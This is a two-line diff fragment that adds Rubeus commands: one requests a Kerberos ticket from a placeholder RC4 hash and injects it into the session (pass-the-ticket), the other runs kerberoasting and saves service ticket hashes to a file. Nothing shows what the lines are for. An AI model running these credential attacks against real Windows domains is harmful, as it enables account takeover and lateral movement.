@@ -1,0 +1,2 @@
+Rubeus.exe asktgt /user:svc /rc4:0000 /ptt
+Rubeus.exe kerberoast /outfile:h.txt
